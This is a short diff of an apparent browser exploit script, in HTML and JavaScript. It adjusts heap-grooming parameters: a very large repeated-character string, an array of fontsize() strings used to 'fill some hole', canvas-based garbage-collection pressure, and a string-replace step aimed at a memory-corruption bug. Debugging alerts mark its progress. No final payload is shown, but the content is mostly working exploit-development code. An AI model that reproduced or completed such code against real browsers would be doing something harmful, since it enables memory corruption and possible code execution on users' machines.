@@ -1,5 +1,5 @@
 <script>	
-alert("start with uint8 value:0xA2A");
+alert("start with uint8 value:0xA3A");
 function gc() {
     try {
         var c = document.createElement("canvas");
@@ -35,7 +35,7 @@ var getSize = function(size) {return (size-0x14)/2}; //string header size = 0x20
 x = createStringWithRepeatedChar(x, 0x1000000);
 x += '2';
 var y = null;
-var arr = new Array(0x1000);
+var arr = new Array(0x50);
 var cvs = document.createElement('canvas');
 //fill some hole
 for (var i = 0; i < arr.length; i++) {
@@ -43,7 +43,7 @@ arr[i] = c.fontsize(1);
 }
 var s1 = c.fontsize(1) ;
 x.replace(/\d/g, s1);
-
+c = ''
 alert("ok");
 if (1) {
     var s_size = 0x10000
